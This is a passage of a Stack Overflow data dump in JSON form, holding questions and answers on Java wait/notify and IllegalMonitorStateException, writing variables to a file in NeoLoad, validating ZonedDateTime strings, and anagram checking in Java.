designed to wait until something happens, and that something is _not_ primarily &#39;x amount of time has passed&#39;. It&#39;s for some _other_ thread to signal: This is the moment.. wake up!\r\n\r\nIf you just want the thread to wait for a provided amount of time, the call you are looking for is not `t.wait`, but is `Thread.sleep(1000)` - that sleeps for 1 second (1000 milliseconds).\r\n\r\n`wait` goes together with `notify`/`notifyAll` (those 2 methods do almost the same thing). One thread waits, another thread calls notify which causes the first thread to wake up. Yes, there is an overloaded variant of `wait` that takes an amount of milliseconds; that variant will wait until EITHER the stated amount of time has passed OR notify is called; whichever one occurs earlier.\r\n\r\nTo use wait/notify you need an object (and _all_ objects can do this; in retrospect that wasn&#39;t a great way to design this part of the java language but it is what it is; changing it now would be quite backwards incompatible) - you need an object because different parts of your code can choose to do this wait/notify thing at the same time and it wouldn&#39;t do if they are all confused about who is signalling whom.\r\n\r\nIn addition, this notion of &#39;I wait until you tell me to resume&#39; tends to run into some pretty severe threading errors very quickly, so in practice and because such a signal needs some sort of CPU gating anyway, java __requires__ that you own the monitor on that object before you wait OR notify on it. Combining it all, this is what that looks like:\r\n\r\n```\r\npublic class TrainStationPlatform {\r\n  private final Object lock = new Object();\r\n  private Train atPlatform = null;\r\n\r\n  public void enterStation(Train train) {\r\n    synchronized (lock) {\r\n      while (atPlatform != null) {\r\n        // Oh no! There&#39;s a train already at the platform!\r\n        lock.wait(); // let&#39;s wait for it to leave.\r\n      }\r\n\r\n      // The platform is clear, we can enter!\r\n      atPlatform = train;\r\n    }\r\n  }\r\n\r\n  public void leave() {\r\n    synchronized (lock) {\r\n      if (atPlatform == null) throw new IllegalStateException(&quot;No train&quot;);\r\n      atPlatform = null;\r\n      lock.notifyAll();\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nThis shows how you can use this:\r\n\r\n* The above code is &#39;safe&#39;: It is not possible when using this code for 2 trains to be at the platform at the same time. Assume to understand this code each train is its own thread and calls `enter(this)` and `leave()` on its own. Any train trying to enter when there&#39;s a different train already at the platform will &#39;freeze&#39; (its `enter` call will pause until the already-there train takes off, and _then_ it will enter the platform, and the `enter` method returns).\r\n* You can&#39;t call `x.notify` or `x.wait` unless you are inside a `synchronized (x)` block, where all `x`-es are referring to the same object.\r\n* As an aside, locking on publically visible things is a very bad idea (maybe other code also locks on it, and then your code is a buggy mess-o-spaghetti nobody can understand or properly test!). threads are VERY public, and in fact, threads lock on themselves all the time, so using them as a lock object is horrible.\r\n* Combine the above two rules, and you can correctly conclude that calling `t.wait()` where `t` is a thread is __never a correct action. Do not do this.__\r\n* It shows _why_ that locking (`synchronized`) is needed. Imagine the synchronized stuff wasn&#39;t there - you would draw the conclusion there is a train and in between drawing that conclusion and calling wait(), let&#39;s say the other thread makes the train that is there go away. You&#39;re still calling wait, waiting for an event that will never happen (because the train already left). This is the kind of crazy trickery that this construction avoids entirely by _requiring_ that you lock on the think you want to call wait on first. The above code can never run into that problem.\r\n* When you invoke `x.wait()`, your lock on `x` (the `synchronized` block, freezing all other threads that want to enter such a synchronized construct) is __relinquished__ - other threads can now enter.\r\n* When your `wait` call returns (whether by timeout if you use that, or because someone called notify), your thread does not __immediately__ continue. After all, calling notify requires having the lock, and wait() won&#39;t continue until it has re-acquired it, which means it has to wait for whatever called notify to get to the end of its synchronized block first.\r\n* `notify()` wakes up a random `wait()`ing thread, `notifyAll()` wakes them all up. It tends to be more sensible to perform the check to confirm whatever you need is there (or not there and requires `wait()`ing for) in a loop, and use `notifyAll()`. Easier to reason about, and there is no meaningful performance difference.\r\n* These are fairly low-level; often there&#39;s something in the `java.util.concurrent` package that is easier to use and makes more sense for whatever inter-thread signalling needs you have.\r\n* If you have no need to signal/gate between threads, do not use this stuff. Use `Thread.sleep` instead.\r\n* Whatever object you use as a lock should virtually always be `private` - you want to keep very careful track of who uses it as a lock, which you can&#39;t do if code outside of your direct control can see that object. __If__ you make it public, you either add extensive documentation explaining precisely what any code that acquires this object can and cannot do and how it is supposed to use it, __or__ your code is a buggy mess that is going to result, sooner rather than later, in very nasty intermittent heisenbugs that take months to fix or end up being unfixable. So, don&#39;t.\r\n* The exception `java.lang.IllegalMonitorStateException: current thread is not owner` occurs when you invoke `x.wait` or `x.notify/notifyAll` when you are _not_ in a `synchronized (x)` block.\r\n* If you want your objects to be serializable, use `private Object lock = new Object[0]`. arrays are serializable; `new Object()` is not, and `new Object[0]` is as light weight as they come.","title":"Java Error: Exception in thread &quot;main&quot; java.lang.IllegalMonitorStateException: current thread is not owner","body":"<p><code>wait</code> is a low-level construct designed to wait until something happens, and that something is <em>not</em> primarily 'x amount of time has passed'. It's for some <em>other</em> thread to signal: This is the moment.. wake up!</p>\n<p>If you just want the thread to wait for a provided amount of time, the call you are looking for is not <code>t.wait</code>, but is <code>Thread.sleep(1000)</code> - that sleeps for 1 second (1000 milliseconds).</p>\n<p><code>wait</code> goes together with <code>notify</code>/<code>notifyAll</code> (those 2 methods do almost the same thing). One thread waits, another thread calls notify which causes the first thread to wake up. Yes, there is an overloaded variant of <code>wait</code> that takes an amount of milliseconds; that variant will wait until EITHER the stated amount of time has passed OR notify is called; whichever one occurs earlier.</p>\n<p>To use wait/notify you need an object (and <em>all</em> objects can do this; in retrospect that wasn't a great way to design this part of the java language but it is what it is; changing it now would be quite backwards incompatible) - you need an object because different parts of your code can choose to do this wait/notify thing at the same time and it wouldn't do if they are all confused about who is signalling whom.</p>\n<p>In addition, this notion of 'I wait until you tell me to resume' tends to run into some pretty severe threading errors very quickly, so in practice and because such a signal needs some sort of CPU gating anyway, java <strong>requires</strong> that you own the monitor on that object before you wait OR notify on it. Combining it all, this is what that looks like:</p>\n<pre><code>public class TrainStationPlatform {\n  private final Object lock = new Object();\n  private Train atPlatform = null;\n\n  public void enterStation(Train train) {\n    synchronized (lock) {\n      while (atPlatform != null) {\n        // Oh no! There's a train already at the platform!\n        lock.wait(); // let's wait for it to leave.\n      }\n\n      // The platform is clear, we can enter!\n      atPlatform = train;\n    }\n  }\n\n  public void leave() {\n    synchronized (lock) {\n      if (atPlatform == null) throw new IllegalStateException(&quot;No train&quot;);\n      atPlatform = null;\n      lock.notifyAll();\n    }\n  }\n}\n</code></pre>\n<p>This shows how you can use this:</p>\n<ul>\n<li>The above code is 'safe': It is not possible when using this code for 2 trains to be at the platform at the same time. Assume to understand this code each train is its own thread and calls <code>enter(this)</code> and <code>leave()</code> on its own. Any train trying to enter when there's a different train already at the platform will 'freeze' (its <code>enter</code> call will pause until the already-there train takes off, and <em>then</em> it will enter the platform, and the <code>enter</code> method returns).</li>\n<li>You can't call <code>x.notify</code> or <code>x.wait</code> unless you are inside a <code>synchronized (x)</code> block, where all <code>x</code>-es are referring to the same object.</li>\n<li>As an aside, locking on publically visible things is a very bad idea (maybe other code also locks on it, and then your code is a buggy mess-o-spaghetti nobody can understand or properly test!). threads are VERY public, and in fact, threads lock on themselves all the time, so using them as a lock object is horrible.</li>\n<li>Combine the above two rules, and you can correctly conclude that calling <code>t.wait()</code> where <code>t</code> is a thread is <strong>never a correct action. Do not do this.</strong></li>\n<li>It shows <em>why</em> that locking (<code>synchronized</code>) is needed. Imagine the synchronized stuff wasn't there - you would draw the conclusion there is a train and in between drawing that conclusion and calling wait(), let's say the other thread makes the train that is there go away. You're still calling wait, waiting for an event that will never happen (because the train already left). This is the kind of crazy trickery that this construction avoids entirely by <em>requiring</em> that you lock on the think you want to call wait on first. The above code can never run into that problem.</li>\n<li>When you invoke <code>x.wait()</code>, your lock on <code>x</code> (the <code>synchronized</code> block, freezing all other threads that want to enter such a synchronized construct) is <strong>relinquished</strong> - other threads can now enter.</li>\n<li>When your <code>wait</code> call returns (whether by timeout if you use that, or because someone called notify), your thread does not <strong>immediately</strong> continue. After all, calling notify requires having the lock, and wait() won't continue until it has re-acquired it, which means it has to wait for whatever called notify to get to the end of its synchronized block first.</li>\n<li><code>notify()</code> wakes up a random <code>wait()</code>ing thread, <code>notifyAll()</code> wakes them all up. It tends to be more sensible to perform the check to confirm whatever you need is there (or not there and requires <code>wait()</code>ing for) in a loop, and use <code>notifyAll()</code>. Easier to reason about, and there is no meaningful performance difference.</li>\n<li>These are fairly low-level; often there's something in the <code>java.util.concurrent</code> package that is easier to use and makes more sense for whatever inter-thread signalling needs you have.</li>\n<li>If you have no need to signal/gate between threads, do not use this stuff. Use <code>Thread.sleep</code> instead.</li>\n<li>Whatever object you use as a lock should virtually always be <code>private</code> - you want to keep very careful track of who uses it as a lock, which you can't do if code outside of your direct control can see that object. <strong>If</strong> you make it public, you either add extensive documentation explaining precisely what any code that acquires this object can and cannot do and how it is supposed to use it, <strong>or</strong> your code is a buggy mess that is going to result, sooner rather than later, in very nasty intermittent heisenbugs that take months to fix or end up being unfixable. So, don't.</li>\n<li>The exception <code>java.lang.IllegalMonitorStateException: current thread is not owner</code> occurs when you invoke <code>x.wait</code> or <code>x.notify/notifyAll</code> when you are <em>not</em> in a <code>synchronized (x)</code> block.</li>\n<li>If you want your objects to be serializable, use <code>private Object lock = new Object[0]</code>. arrays are serializable; <code>new Object()</code> is not, and <code>new Object[0]</code> is as light weight as they come.</li>\n</ul>\n"}],"owner":{"account_id":27864418,"reputation":15,"user_id":21276226,"display_name":"Intermaker"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":513,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"accepted_answer_id":76204363,"answer_count":2,"score":-1,"last_activity_date":1683727125,"creation_date":1683573564,"question_id":76203740,"body_markdown":"I am trying to make a wait in java using Thread, but i get the error:\r\n`Exception in thread &quot;main&quot; java.lang.IllegalMonitorStateException: current thread is not owner`\r\n\r\nI have tried\r\n\r\n```java\r\nThread t = new Thread();\r\ntry {\r\n    t.wait(2000);\r\n} catch (InterruptedException e) {\r\n    //TODO Auto-generated catch block\r\n    e.printStackTrace();\r\n}\r\n```\r\n\r\nbut It didn&#39;t work, I&#39;ve searched StackOverFlow for answers but I couldn&#39;t find anything useful\r\n","title":"Java Error: Exception in thread &quot;main&quot; java.lang.IllegalMonitorStateException: current thread is not owner","body":"<p>I am trying to make a wait in java using Thread, but i get the error:\n<code>Exception in thread &quot;main&quot; java.lang.IllegalMonitorStateException: current thread is not owner</code></p>\n<p>I have tried</p>\n<pre class=\"lang-java prettyprint-override\"><code>Thread t = new Thread();\ntry {\n    t.wait(2000);\n} catch (InterruptedException e) {\n    //TODO Auto-generated catch block\n    e.printStackTrace();\n}\n</code></pre>\n<p>but It didn't work, I've searched StackOverFlow for answers but I couldn't find anything useful</p>\n"},{"tags":["javascript","java","automated-tests","performance-testing","neoload"],"answers":[{"tags":[],"owner":{"account_id":353426,"reputation":5631,"user_id":691105,"display_name":"James Pulley"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683727110,"creation_date":1683727110,"answer_id":76219314,"question_id":76113003,"body_markdown":"This is not recommended during performance testing (for any tool) to have raw file IO to an output file accessed by multiple virtual users.   This will create lock problems and performance issues on your load generators.  Again, this is independent of tool.\r\n\r\nThe most common reason that people try to engage in this behavior is to pass data from one script to another.   The recommended path is to leverage a queue service for this type of passing of data, where one script generates output that is needed as input for a different script.   You have many paths here, but I would recommend considering any of the cloud based queue services that have HTTP interfaces and are super cheap for hundreds of thousands of messages.  You also have the ability to leverage RabbitMQ as an internally installed piece of software.   It also has available HTTP interfaces for direct inclusion in your test code.\r\n\r\n","title":"Writing an extracted variable in External File in Neoload","body":"<p>This is not recommended during performance testing (for any tool) to have raw file IO to an output file accessed by multiple virtual users.   This will create lock problems and performance issues on your load generators.  Again, this is independent of tool.</p>\n<p>The most common reason that people try to engage in this behavior is to pass data from one script to another.   The recommended path is to leverage a queue service for this type of passing of data, where one script generates output that is needed as input for a different script.   You have many paths here, but I would recommend considering any of the cloud based queue services that have HTTP interfaces and are super cheap for hundreds of thousands of messages.  You also have the ability to leverage RabbitMQ as an internally installed piece of software.   It also has available HTTP interfaces for direct inclusion in your test code.</p>\n"}],"owner":{"account_id":21961639,"reputation":63,"user_id":16258097,"display_name":"usama ibrahim"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":398,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1683727110,"creation_date":1682525976,"question_id":76113003,"body_markdown":"I&#39;m using Neoload 8.0.2 and I want to write a variable extracted from response in an external .txt file. For that I am using Neoload&#39;s JavaScript Action and I have written the following code snippet: \r\n\r\n    var file = java.io.File(&quot;C:\\\\filename.txt&quot;);\r\n    var writer = new java.io.FileWriter(file,true);\r\n    var var1 = context.variableManager.getValue(&quot;extVar&quot;);\r\n    writer.write(var1 + &quot;\\n&quot;);\r\n    writer.close();\r\n\r\nI am not getting any errors in Neoload but file is not being created and if I create a file in the mentioned path myself the extvar (extracted variable) don&#39;t gets written on it. \r\nIs there something wrong with this script or \r\ndo I need to install any . jar classes in Neoload? \r\nOr does java.io.file is pre-installed in Neoload?\r\n\r\nAny guidance will he helpful.","title":"Writing an extracted variable in External File in Neoload","body":"<p>I'm using Neoload 8.0.2 and I want to write a variable extracted from response in an external .txt file. For that I am using Neoload's JavaScript Action and I have written the following code snippet:</p>\n<pre><code>var file = java.io.File(&quot;C:\\\\filename.txt&quot;);\nvar writer = new java.io.FileWriter(file,true);\nvar var1 = context.variableManager.getValue(&quot;extVar&quot;);\nwriter.write(var1 + &quot;\\n&quot;);\nwriter.close();\n</code></pre>\n<p>I am not getting any errors in Neoload but file is not being created and if I create a file in the mentioned path myself the extvar (extracted variable) don't gets written on it.\nIs there something wrong with this script or\ndo I need to install any . jar classes in Neoload?\nOr does java.io.file is pre-installed in Neoload?</p>\n<p>Any guidance will he helpful.</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":1691630,"reputation":49583,"user_id":1553851,"accept_rate":73,"display_name":"shmosel"},"score":1,"creation_date":1515700823,"post_id":48214813,"comment_id":83411641,"body_markdown":"Just try parsing it and catch the exception.","body":"Just try parsing it and catch the exception."}],"answers":[{"tags":[],"owner":{"account_id":39409,"reputation":47624,"user_id":113632,"accept_rate":84,"display_name":"dimo414"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1515701381,"creation_date":1515701381,"answer_id":48215058,"question_id":48214813,"body_markdown":"&gt; using exceptions as return values is bad practice and performance-costly.\r\n\r\nIt&#39;s a good point, and worth looking for alternatives, but in some cases that&#39;s simply the API that&#39;s provided. Often for parsing you really do want an exception because parse failures are the *exceptional* case - you expect the value to parse and just need to account for the possibility that it doesn&#39;t.\r\n\r\nIn this case I&#39;d just catch the exception as you&#39;re doing.","title":"Check if datetime string is convertible to ZonedDateTime","body":"<blockquote>\n  <p>using exceptions as return values is bad practice and performance-costly.</p>\n</blockquote>\n\n<p>It's a good point, and worth looking for alternatives, but in some cases that's simply the API that's provided. Often for parsing you really do want an exception because parse failures are the <em>exceptional</em> case - you expect the value to parse and just need to account for the possibility that it doesn't.</p>\n\n<p>In this case I'd just catch the exception as you're doing.</p>\n"},{"tags":[],"owner":{"account_id":983997,"reputation":7005,"user_id":1002972,"accept_rate":61,"display_name":"manash"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1515741107,"creation_date":1515701546,"answer_id":48215099,"question_id":48214813,"body_markdown":"If you look at the `ZonedDateTime.parse` method implementation, you will find that the method is defined as follows:\r\n\r\n    public static ZonedDateTime parse(CharSequence text) {\r\n        return parse(text, DateTimeFormatter.ISO_ZONED_DATE_TIME);\r\n    }\r\n    \r\n    public static ZonedDateTime parse(CharSequence text, DateTimeFormatter formatter) {\r\n        Objects.requireNonNull(formatter, &quot;formatter&quot;);\r\n        return formatter.parse(text, ZonedDateTime::from);\r\n    }\r\n\r\nIf you also look at `DateTimeFormatter`, you will find a method named `parseUnresolved`. You can use it as follows:\r\n\r\n    DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(str, new ParsePosition(0));\r\n\r\nThe passed string will be parsed but not resolved. You can then look at `parseResolved0` implementation and perform actual resolving without throwing exceptions. You will have to use method return value instead.\r\n\r\nThe method you need would look like this:\r\n\r\n    public TemporalAccessor parse(final CharSequence text) {\r\n        ParsePosition pos = new ParsePosition(0);\r\n        TemporalAccessor temporalAccessor = DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(text, pos);\r\n        if (temporalAccessor == null || pos.getErrorIndex() &gt;= 0 || pos.getIndex() &lt; text.length()) {\r\n            return null;\r\n        }\r\n        return temporalAccessor;\r\n    }\r\n\r\nNote that the returned `TemporalAccessor` will not be resolved. I need to look at the code more deeply to find exactly what it means.\r\n\r\nFinally, if you want to check if a string can be parsed as `ZonedDateTime` without exceptions, you just need to check the return value:\r\n\r\n    parse(&quot;2018-01-11T21:32:10.876+02:00&quot;); //return ZonedDateTime instance\r\n    parse(&quot;blah blah&quot;); //return null\r\n\r\n**EDIT:**\r\n\r\nSince the returned `Parsed` can&#39;t be used, it is &quot;wrong&quot; to write a parse method (unless the methods exposed by TemporalAccessor are useful to you). Therefore, a method that checks validity would be more correct:\r\n\r\n    public boolean isParseableAsZonedDateTime(final CharSequence text) {\r\n        ParsePosition pos = new ParsePosition(0);\r\n        TemporalAccessor temporalAccessor = DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(text, pos);\r\n        if (temporalAccessor == null || pos.getErrorIndex() &gt;= 0 || pos.getIndex() &lt; text.length()) {\r\n            return false;\r\n        }\r\n        return true;\r\n    }","title":"Check if datetime string is convertible to ZonedDateTime","body":"<p>If you look at the <code>ZonedDateTime.parse</code> method implementation, you will find that the method is defined as follows:</p>\n\n<pre><code>public static ZonedDateTime parse(CharSequence text) {\n    return parse(text, DateTimeFormatter.ISO_ZONED_DATE_TIME);\n}\n\npublic static ZonedDateTime parse(CharSequence text, DateTimeFormatter formatter) {\n    Objects.requireNonNull(formatter, \"formatter\");\n    return formatter.parse(text, ZonedDateTime::from);\n}\n</code></pre>\n\n<p>If you also look at <code>DateTimeFormatter</code>, you will find a method named <code>parseUnresolved</code>. You can use it as follows:</p>\n\n<pre><code>DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(str, new ParsePosition(0));\n</code></pre>\n\n<p>The passed string will be parsed but not resolved. You can then look at <code>parseResolved0</code> implementation and perform actual resolving without throwing exceptions. You will have to use method return value instead.</p>\n\n<p>The method you need would look like this:</p>\n\n<pre><code>public TemporalAccessor parse(final CharSequence text) {\n    ParsePosition pos = new ParsePosition(0);\n    TemporalAccessor temporalAccessor = DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(text, pos);\n    if (temporalAccessor == null || pos.getErrorIndex() &gt;= 0 || pos.getIndex() &lt; text.length()) {\n        return null;\n    }\n    return temporalAccessor;\n}\n</code></pre>\n\n<p>Note that the returned <code>TemporalAccessor</code> will not be resolved. I need to look at the code more deeply to find exactly what it means.</p>\n\n<p>Finally, if you want to check if a string can be parsed as <code>ZonedDateTime</code> without exceptions, you just need to check the return value:</p>\n\n<pre><code>parse(\"2018-01-11T21:32:10.876+02:00\"); //return ZonedDateTime instance\nparse(\"blah blah\"); //return null\n</code></pre>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Since the returned <code>Parsed</code> can't be used, it is \"wrong\" to write a parse method (unless the methods exposed by TemporalAccessor are useful to you). Therefore, a method that checks validity would be more correct:</p>\n\n<pre><code>public boolean isParseableAsZonedDateTime(final CharSequence text) {\n    ParsePosition pos = new ParsePosition(0);\n    TemporalAccessor temporalAccessor = DateTimeFormatter.ISO_ZONED_DATE_TIME.parseUnresolved(text, pos);\n    if (temporalAccessor == null || pos.getErrorIndex() &gt;= 0 || pos.getIndex() &lt; text.length()) {\n        return false;\n    }\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":156295,"reputation":755,"user_id":373498,"accept_rate":50,"display_name":"Huluvu424242"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683727071,"creation_date":1683727071,"answer_id":76219304,"question_id":48214813,"body_markdown":"I use in junit5 tests this code snippet\r\n\r\n```assertDoesNotThrow(() -&gt; ZonedDateTime.parse(&quot;invalid zoned datetime&quot;));```","title":"Check if datetime string is convertible to ZonedDateTime","body":"<p>I use in junit5 tests this code snippet</p>\n<p><code>assertDoesNotThrow(() -&gt; ZonedDateTime.parse(&quot;invalid zoned datetime&quot;));</code></p>\n"}],"owner":{"account_id":1887647,"reputation":5261,"user_id":1706545,"accept_rate":89,"display_name":"Daniel Taub"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3370,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":48215099,"answer_count":3,"score":2,"last_activity_date":1683727071,"creation_date":1515700153,"question_id":48214813,"body_markdown":"I want to check if my `String` is convertible to [`ZonedDateTime`][1]\r\n\r\n     String datetime = &quot;2018-01-11T21:32:10.876+02:00&quot;; // valid\r\n     String badDateTime = &quot;blah blah&quot;; //not valid\r\nI thought about checking it with [this regex][2] but this is not a relevant solution for me because of private reasons.\r\n\r\nI also thought about use `try..catch` in that way \r\n\r\n    \r\n    public void testing() {\r\n        String datetime = &quot;2018-01-11T21:32:10.876+02:00&quot;;\r\n        \r\n        System.out.println(isDateTime(&quot;no&quot;)); // false\r\n        System.out.println(isDateTime(datetime)); // true\r\n    }\r\n\r\n\r\n    private boolean isDateTime(String str){\r\n        boolean checkDateTimeString;\r\n\r\n        try {\r\n            ZonedDateTime.parse(str);\r\n            checkDateTimeString = true;\r\n        } catch (DateTimeParseException e){\r\n            checkDateTimeString = false;\r\n        }\r\n\r\n        return checkDateTimeString;\r\n    }\r\n\r\nBut using exceptions as return values is bad practice and performance-costly.&lt;br&gt;&lt;br&gt;\r\nIs there any other simple and good way to do that thing?\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/8/docs/api/java/time/ZonedDateTime.html\r\n  [2]: https://stackoverflow.com/questions/28020805/regex-validate-correct-iso8601-date-string-with-time","title":"Check if datetime string is convertible to ZonedDateTime","body":"<p>I want to check if my <code>String</code> is convertible to <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/ZonedDateTime.html\" rel=\"nofollow noreferrer\"><code>ZonedDateTime</code></a></p>\n\n<pre><code> String datetime = \"2018-01-11T21:32:10.876+02:00\"; // valid\n String badDateTime = \"blah blah\"; //not valid\n</code></pre>\n\n<p>I thought about checking it with <a href=\"https://stackoverflow.com/questions/28020805/regex-validate-correct-iso8601-date-string-with-time\">this regex</a> but this is not a relevant solution for me because of private reasons.</p>\n\n<p>I also thought about use <code>try..catch</code> in that way </p>\n\n<pre><code>public void testing() {\n    String datetime = \"2018-01-11T21:32:10.876+02:00\";\n\n    System.out.println(isDateTime(\"no\")); // false\n    System.out.println(isDateTime(datetime)); // true\n}\n\n\nprivate boolean isDateTime(String str){\n    boolean checkDateTimeString;\n\n    try {\n        ZonedDateTime.parse(str);\n        checkDateTimeString = true;\n    } catch (DateTimeParseException e){\n        checkDateTimeString = false;\n    }\n\n    return checkDateTimeString;\n}\n</code></pre>\n\n<p>But using exceptions as return values is bad practice and performance-costly.<br><br>\nIs there any other simple and good way to do that thing?</p>\n"},{"tags":["java","algorithm","data-structures","anagram"],"comments":[{"owner":{"account_id":33530,"reputation":11809,"user_id":93953,"accept_rate":56,"display_name":"Mike Clark"},"score":3,"creation_date":1354570934,"post_id":13692221,"comment_id":18799822,"body_markdown":"Can you explain what you are seeing wrong?  Does an exception throw?  Does it just not return what you expect?  Does it infinite-loop?","body":"Can you explain what you are seeing wrong?  Does an exception throw?  Does it just not return what you expect?  Does it infinite-loop?"},{"owner":{"account_id":1853886,"reputation":210597,"user_id":1679863,"accept_rate":77,"display_name":"Rohit Jain"},"score":0,"creation_date":1354571102,"post_id":13692221,"comment_id":18799902,"body_markdown":"Can you give an example as to what is an `Anagram` in your case?","body":"Can you give an example as to what is an <code>Anagram</code> in your case?"},{"owner":{"account_id":2108008,"reputation":249,"user_id":1873885,"accept_rate":27,"display_name":"SemihY"},"score":0,"creation_date":1354571143,"post_id":13692221,"comment_id":18799923,"body_markdown":"No, only I wrote des and sed but output is not anagram","body":"No, only I wrote des and sed but output is not anagram"},{"owner":{"account_id":350281,"reputation":2772,"user_id":686041,"accept_rate":90,"display_name":"Konstantin Tarashchanskiy"},"score":2,"creation_date":1354572608,"post_id":13692221,"comment_id":18800563,"body_markdown":"Why does your code not work? Because you overwrite `newStr` with `s2` (less a letter) every time you get a match. For example, if `s2` is `ab`, when you match `b`, `newStr` becomes `a`, then when you match `a`, `newStr` does not become the empty string, but becomes `b` (since it is `s2` less the matching character). It is not the only bug in your code (repeated characters, different length strings), but it is the one that you are going to see first.","body":"Why does your code not work? Because you overwrite <code>newStr</code> with <code>s2</code> (less a letter) every time you get a match. For example, if <code>s2</code> is <code>ab</code>, when you match <code>b</code>, <code>newStr</code> becomes <code>a</code>, then when you match <code>a</code>, <code>newStr</code> does not become the empty string, but becomes <code>b</code> (since it is <code>s2</code> less the matching character). It is not the only bug in your code (repeated characters, different length strings), but it is the one that you are going to see first."},{"owner":{"account_id":667308,"reputation":46349,"user_id":1161878,"accept_rate":81,"display_name":"Gene"},"score":0,"creation_date":1578892526,"post_id":13692221,"comment_id":105573402,"body_markdown":"Probably worth noting after all this time that Java has progressed sufficiently to make this a one-liner: `Arrays.equals(\n        a.chars().filter(Character::isAlphabetic).sorted().toArray(), \n        b.chars().filter(Character::isAlphabetic).sorted().toArray());`","body":"Probably worth noting after all this time that Java has progressed sufficiently to make this a one-liner: <code>Arrays.equals(         a.chars().filter(Character::isAlphabetic).sorted().toArray()&zwnj;&#8203;,          b.chars().filter(Character::isAlphabetic).sorted().toArray()&zwnj;&#8203;);</code>"}],"answers":[{"tags":[],"owner":{"account_id":1853886,"reputation":210597,"user_id":1679863,"accept_rate":77,"display_name":"Rohit Jain"},"down_vote_count":0,"up_vote_count":9,"is_accepted":false,"score":9,"last_activity_date":1354573435,"creation_date":1354570928,"answer_id":13692242,"question_id":13692221,"body_markdown":"    if(s1.charAt(i)==s2.charAt(j))\r\n            delStr=s1.substring(i,i+1);\r\n            newStr=s2.replace(delStr,&quot;&quot;);\r\n\r\nThis code is a nice demonstration of why you should always have `curly braces` around your `if`, even if there is only a single statement. Your 2nd assignment is actually outside the `if-condition`, and will always happen.\r\n\r\nThe best way to check for two strings to be `Anagram` is to convert them to a character array `(String#toCharArray)`. Then sort them using `Arrays.sort` method. And do the comparison on them.\r\n\r\n\r\n----------\r\n**Updated : -**\r\n\r\nIf you just want to use `String` methods, then you don&#39;t actually need a nested loop there. You can do it with just one.\r\n\r\nHere&#39;s the modified code of yours: -\r\n\r\n    public static boolean isAnagram(String s1 , String s2){\r\n        \r\n        if (s1.length() != s2.length()) {\r\n            return false;\r\n        }\r\n    \r\n        for(int i = 0; i &lt; s2.length(); i++) {\r\n\r\n                if( !s1.contains(&quot;&quot; + s2.charAt(i))) {\r\n                    return false;\r\n                }\r\n\r\n                s1 = s1.replaceFirst(&quot;&quot; + s2.charAt(i), &quot;&quot;);\r\n\t            s2 = s2.replaceFirst(&quot;&quot; + s2.charAt(i), &quot;&quot;);\r\n        }\r\n        return true;\r\n    }\r\n\r\n","title":"Anagram algorithm in java","body":"<pre><code>if(s1.charAt(i)==s2.charAt(j))\n        delStr=s1.substring(i,i+1);\n        newStr=s2.replace(delStr,\"\");\n</code></pre>\n\n<p>This code is a nice demonstration of why you should always have <code>curly braces</code> around your <code>if</code>, even if there is only a single statement. Your 2nd assignment is actually outside the <code>if-condition</code>, and will always happen.</p>\n\n<p>The best way to check for two strings to be <code>Anagram</code> is to convert them to a character array <code>(String#toCharArray)</code>. Then sort them using <code>Arrays.sort</code> method. And do the comparison on them.</p>\n\n<hr>\n\n<p><strong>Updated : -</strong></p>\n\n<p>If you just want to use <code>String</code> methods, then you don't actually need a nested loop there. You can do it with just one.</p>\n\n<p>Here's the modified code of yours: -</p>\n\n<pre><code>public static boolean isAnagram(String s1 , String s2){\n\n    if (s1.length() != s2.length()) {\n        return false;\n    }\n\n    for(int i = 0; i &lt; s2.length(); i++) {\n\n            if( !s1.contains(\"\" + s2.charAt(i))) {\n                return false;\n            }\n\n            s1 = s1.replaceFirst(\"\" + s2.charAt(i), \"\");\n            s2 = s2.replaceFirst(\"\" + s2.charAt(i), \"\");\n    }\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1932818,"reputation":46083,"user_id":1741864,"display_name":"sampson-chen"},"down_vote_count":2,"up_vote_count":34,"is_accepted":false,"score":32,"last_activity_date":1444321357,"creation_date":1354571191,"answer_id":13692305,"question_id":13692221,"body_markdown":"An easier way might be to just sort the chars in both strings, and compare whether they are equal:\r\n\r\n\r\n    public static boolean isAnagram(String s1, String s2){\r\n\r\n            // Early termination check, if strings are of unequal lengths,\r\n            // then they cannot be anagrams\r\n            if ( s1.length() != s2.length() ) {\r\n                return false;\r\n            }\r\n            s1=s1.toLowerCase();\r\n\t\t\ts2=s2.toLowerCase();\r\n            char[] c1 = s1.toCharArray();\r\n            char[] c2 = s2.toCharArray();\r\n            Arrays.sort(c1);\r\n            Arrays.sort(c2);\r\n            String sc1 = new String(c1);\r\n            String sc2 = new String(c2);\r\n            return sc1.equals(sc2);\r\n    }\r\n\r\nPersonally I think it&#39;s more readable than nested for-loops =p\r\n\r\nThis has **O(n log n)** run-time complexity, where `n` is the length of the longer string.\r\n\r\nEdit: this is not the optimal solution. See @aam1r&#39;s answer for the most efficient approach (i.e. what you should actually say in an interview)","title":"Anagram algorithm in java","body":"<p>An easier way might be to just sort the chars in both strings, and compare whether they are 